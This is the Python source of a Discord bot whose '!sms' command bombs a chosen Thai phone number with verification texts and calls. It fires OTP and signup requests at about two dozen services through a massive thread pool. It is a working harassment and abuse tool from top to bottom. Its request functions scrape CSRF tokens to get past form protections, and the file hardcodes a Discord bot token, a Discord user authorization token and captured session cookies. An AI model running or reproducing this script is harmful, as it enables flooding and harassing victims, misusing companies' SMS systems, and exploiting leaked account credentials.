import discord,time
import discord
import requests
import time
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading

token = "OTkzNTM2NDIzMDI0MTMyMDk2.G5URRV.NHUeEgAnpTBi_RmiOpvfFXDRcP8BX8ga7KcUfE"



prefix = "!"

bot = commands.Bot(command_prefix=prefix,help_command=None)
threading = ThreadPoolExecutor(max_workers=int(100000000))
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def cang01(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
def cang02(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
    
def cang03(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
   
   
def cang1(phone):
    post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
    
    
def cang2(phone):
    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    
def cang3(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 


def cang4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    
    
def cang5(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
    
def cang6(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def cang7(phone):
    post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
    
def cang8(phone):
    post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
    
 
def cang9(phone):
    post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
    
def cang10(phone):
    post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)
    
def cang11(phone):
    post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
        "language": "th"},headers={"accept": "application/json, text/plain, /",
      "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
   
def cang12(phone):
  post("https://discord.com/api/v9/users/@me/phone",json={
  "phone": "+66"+phone,
  "change_phone_reason": "guild_phone_required"
},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})


def cang13(phone):
  post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":f"{phone}","function":"enroll"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "visid_incap_2104120=FpehtdvzRDuqWIUnbb2obcmSJ2IAAAAAQUIPAAAAAABOfPmHrdd2l1h5JKcTW+MB;tids=bsdi3vf25ea3jinbn8f4r596jpdeqeer;_ga_id=1558776998.1646760667;_gcl_au=1.1.1142664624.1646763274;_ga=GA1.2.1363432684.1646763274;_gid=GA1.2.2042579673.1646763275;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B14BC6DC.1;_ctout26068=1;verify=test;_fbp=fb.1.1646763276347.768942143;OptanonAlertBoxClosed=2022-03-08T18:14:39.934Z;OptanonConsent=isIABGlobal=false&datestamp=Wed+Mar+09+2022+01%3A14%3A39+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1;_ga_R05PJC3ZG8=GS1.1.1646763273.1.1.1646763285.48"})


def cang13(phone):
  post("https://kaspy.com/sms/sms.php/",data=f"phone={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
  

def cang14(phone):
  post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
  
def cang15(phone):
  post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,

"retrycount":"0"

    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def cang16(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def cang17(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
     
     
def cang18(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
    
    

def sck(sphone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":sphone,"password":"1111a1111A","name":sphone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def cang19(phone):
    post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
    
def cang20(phone):
  post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone,
  })

  
def cang21(phone):
  requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")

    
def cang22(phone):
  requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
  
def cang23(phone):
   requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
   
def cang24(phone):
  requests.get("https://findclone.ru/register?phone=+66"+phone)
  
def BBot(phone, amount):
    for i in range(amount):
       
        
        
        
        threading.submit(cang01,phone)
        threading.submit(cang02,phone)
        threading.submit(cang03,phone)
        threading.submit(cang1,phone)
        threading.submit(cang2,phone)
        threading.submit(cang3,phone)
        threading.submit(cang3,phone)
        threading.submit(cang4,phone)
        threading.submit(cang5,phone)
        threading.submit(cang6,phone)
        threading.submit(cang7,phone)
        threading.submit(cang8,phone)
        threading.submit(cang9,phone)
        threading.submit(cang10,phone)
        threading.submit(cang11,phone)
        threading.submit(cang12,phone)
        threading.submit(cang13,phone)
        threading.submit(cang14,phone)
        threading.submit(cang15,phone)
        threading.submit(cang16,phone)
        threading.submit(cang17,phone)
        threading.submit(cang18,phone)
        threading.submit(cang19,phone)
        threading.submit(cang20,phone)        
        threading.submit(cang21,phone)
        threading.submit(cang22,phone)
        threading.submit(cang23,phone)
        threading.submit(cang24,phone)
     
        
@bot.event
async def on_connect():
    print(f"กำลังล็อกอินบอท : {bot.user}")
    time.sleep(1.0)
    print("ล็อกอินสำเร็จ")
 
@bot.command()
async def sms(ctx, phone, amount:int):
    
    if (amount < 151):
      
      embes = discord.Embed(title="Xylinaxxz", description="Developer by : Xylinaxxz",color=0xfff612)
      embes.add_field(name="โดนเรียบร้อย",value=phone)
      ima = "https://cdn.discordapp.com/attachments/789545625523322890/993542929165602876/94ugiyk89xi61.gif"
      embes.set_image(url=ima)
    
      await ctx.channel.send(embed=embes)
    
    
    
      BBot(phone,amount)
    else:
      await ctx.channel.send("่150 SMS")

@bot.command()
async def help(ctx):
  emBed = discord.Embed(title="Developer BY: Xylinaxxz",description="วิธิใช้",color=0xfff612)
  emBed.add_field(name="#_#",value="!sms [เบอร์] [จำนวน]")
  
  
  await ctx.channel.send(embed=emBed)
    
bot.run(token)